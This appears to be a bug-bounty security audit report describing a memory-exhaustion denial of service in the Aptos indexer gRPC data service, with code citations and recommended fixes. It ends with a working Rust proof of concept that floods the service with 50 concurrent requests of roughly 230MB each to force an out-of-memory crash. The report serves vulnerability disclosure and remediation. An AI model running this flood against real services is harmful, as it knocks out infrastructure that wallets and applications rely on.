# Audit Report

## Title
Memory Exhaustion DoS via Unbounded Concurrent Large gRPC Messages in Indexer Data Service

## Summary
The indexer-grpc-data-service-v2 allows unbounded concurrent gRPC requests with messages up to 256MB each, without any connection limits or rate limiting. An attacker can send multiple concurrent large requests to exhaust server memory, causing OOM kills and complete service unavailability.

## Finding Description
The indexer-grpc-data-service-v2 configures a `MAX_MESSAGE_SIZE` of 256MB for both incoming and outgoing gRPC messages, applied to both the RawData and DataService servers. [1](#0-0) 

This limit is enforced during gRPC message deserialization: [2](#0-1) 

However, the service has **no concurrent connection limits or concurrent stream limits**. The tonic Server builder is configured with only HTTP2 keepalive settings, but critically lacks `http2_max_concurrent_streams()` configuration: [3](#0-2) 

Each incoming request spawns a new async task immediately after being received from the handler channel (size 10), allowing unlimited task spawning: [4](#0-3) 

The same pattern exists in HistoricalDataService: [5](#0-4) 

While there is a transaction filter size limit of 10KB, this validation occurs **after** the entire message has been deserialized into memory: [6](#0-5) 

**Attack Flow:**
1. Attacker opens N concurrent HTTP2 streams (N limited only by system resources, no application-level limit)
2. Each stream sends a `GetTransactionsRequest` with a large `transaction_filter` field (up to 256MB)
3. Tonic deserializes each message, allocating up to 256MB per request
4. Each request spawns an async task that processes the large message
5. The handler channel (size 10) is immediately cleared as tasks spawn, accepting more requests
6. With N concurrent requests at 256MB each, total memory consumption is N × 256MB
7. On a typical server with 4-16GB RAM, only 15-60 concurrent requests cause OOM
8. Service crashes with OOM kill, causing complete unavailability

The `BooleanTransactionFilter` protobuf message is recursive and can contain large string fields (addresses, module names, data_substring_filter) allowing an attacker to craft messages approaching the 256MB limit: [7](#0-6) 

## Impact Explanation
**High Severity** per Aptos bug bounty criteria: "API crashes" and service unavailability.

This vulnerability allows an unprivileged attacker to crash the indexer-grpc-data-service-v2, causing:
- Complete service unavailability for all indexer clients
- Data pipeline disruption for applications depending on real-time blockchain data
- Potential cascading failures in monitoring and alerting systems
- Service restart loops if attacks continue

While this affects an auxiliary service rather than core validator nodes, the indexer infrastructure is critical for ecosystem applications, wallets, and explorers that require real-time transaction data.

## Likelihood Explanation
**High Likelihood**. The attack is:
- **Easy to execute**: Standard gRPC clients can open multiple concurrent streams
- **Low cost**: Requires only network bandwidth, no special resources
- **Difficult to detect**: Legitimate clients may also use large filters or multiple connections
- **No authentication barriers**: Service is publicly accessible
- **Reproducible**: Attack succeeds deterministically once concurrent request threshold is reached

## Recommendation
Implement multiple layers of defense:

1. **Add HTTP2 Concurrent Stream Limit**:
```rust
let mut server_builder = Server::builder()
    .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
    .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION))
    .http2_max_concurrent_streams(Some(100)); // Add this limit
```

2. **Reduce MAX_MESSAGE_SIZE**:
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 10 * (1 << 20); // Reduce to 10MB
```

3. **Add Connection-Level Rate Limiting**: Use `tower` middleware to limit requests per connection per time window.

4. **Validate Filter Size Before Deserialization**: This requires custom protobuf decoding logic to check message size before full deserialization, or use a streaming codec that can reject oversized messages early.

5. **Add Global Concurrent Request Semaphore**:
```rust
use tokio::sync::Semaphore;
static REQUEST_SEMAPHORE: OnceCell<Arc<Semaphore>> = OnceCell::new();

// In handler:
let permit = REQUEST_SEMAPHORE.get().unwrap().acquire().await?;
// Process request while holding permit
```

## Proof of Concept

```rust
// PoC demonstrating memory exhaustion attack
use aptos_protos::indexer::v1::{
    raw_data_client::RawDataClient, GetTransactionsRequest, BooleanTransactionFilter,
    boolean_transaction_filter::Filter, EventFilter, MoveStructTagFilter,
};
use tonic::transport::Channel;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let endpoint = "http://indexer-service:50051";
    
    // Create a large filter with long strings to maximize message size
    let large_filter = BooleanTransactionFilter {
        filter: Some(Filter::ApiFilter(aptos_protos::indexer::v1::ApiFilter {
            filter: Some(aptos_protos::indexer::v1::api_filter::Filter::EventFilter(
                EventFilter {
                    struct_type: Some(MoveStructTagFilter {
                        address: Some("0x".to_string() + &"0".repeat(10_000_000)), // ~10MB
                        module: Some("m".repeat(10_000_000)), // ~10MB  
                        name: Some("n".repeat(10_000_000)), // ~10MB
                    }),
                    data_substring_filter: Some("x".repeat(200_000_000)), // ~200MB
                }
            ))
        }))
    };
    
    let request = GetTransactionsRequest {
        starting_version: Some(0),
        transactions_count: Some(100),
        batch_size: Some(100),
        transaction_filter: Some(large_filter),
    };
    
    // Send 50 concurrent requests
    let mut handles = vec![];
    for i in 0..50 {
        let req = request.clone();
        let ep = endpoint.to_string();
        let handle = tokio::spawn(async move {
            let channel = Channel::from_static(&ep).connect().await?;
            let mut client = RawDataClient::new(channel);
            println!("Sending request {}", i);
            let response = client.get_transactions(req).await?;
            Ok::<_, Box<dyn std::error::Error>>(())
        });
        handles.push(handle);
    }
    
    // Wait for all requests - server will likely OOM before this completes
    for handle in handles {
        let _ = handle.await;
    }
    
    Ok(())
}
```

**Expected Result**: After 15-20 concurrent requests complete, server memory consumption exceeds available RAM, triggering OOM killer. Service becomes unavailable.

## Notes
- This vulnerability affects the indexer-grpc-data-service-v2 specifically, which is an auxiliary service for blockchain data access, not a core consensus component
- The vulnerability also exists in the v1 data service at `ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs`
- While transaction_filter size is validated (10KB limit), this check occurs after full message deserialization, making it ineffective against this attack
- HTTP2 keepalive settings help detect dead connections but do not prevent this attack
- The default HTTP2 SETTINGS_MAX_CONCURRENT_STREAMS is typically unlimited or very high (100+), allowing the attack to proceed

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L31-31)
```rust
pub(crate) const MAX_MESSAGE_SIZE: usize = 256 * (1 << 20);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L240-248)
```rust
                .max_decoding_message_size(MAX_MESSAGE_SIZE)
                .max_encoding_message_size(MAX_MESSAGE_SIZE);
        let wrapper_service =
            aptos_protos::indexer::v1::data_service_server::DataServiceServer::from_arc(wrapper)
                .send_compressed(CompressionEncoding::Zstd)
                .accept_compressed(CompressionEncoding::Zstd)
                .accept_compressed(CompressionEncoding::Gzip)
                .max_decoding_message_size(MAX_MESSAGE_SIZE)
                .max_encoding_message_size(MAX_MESSAGE_SIZE);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L251-253)
```rust
        let mut server_builder = Server::builder()
            .http2_keepalive_interval(Some(HTTP2_PING_INTERVAL_DURATION))
            .http2_keepalive_timeout(Some(HTTP2_PING_TIMEOUT_DURATION));
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L98-115)
```rust
                let filter = if let Some(proto_filter) = request.transaction_filter {
                    match filter_utils::parse_transaction_filter(
                        proto_filter,
                        self.max_transaction_filter_size_bytes,
                    ) {
                        Ok(filter) => Some(filter),
                        Err(err) => {
                            info!("Client error: {err:?}.");
                            let _ = response_sender.blocking_send(Err(err));
                            COUNTER
                                .with_label_values(&["live_data_service_invalid_filter"])
                                .inc();
                            continue;
                        },
                    }
                } else {
                    None
                };
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L127-139)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        MAX_BYTES_PER_BATCH,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L112-123)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
```

**File:** protos/proto/aptos/indexer/v1/filter.proto (L58-65)
```text
message BooleanTransactionFilter {
  oneof filter {
      APIFilter api_filter = 1;
      LogicalAndFilters logical_and = 2;
      LogicalOrFilters logical_or = 3;
      BooleanTransactionFilter logical_not = 4;
  }
}
```
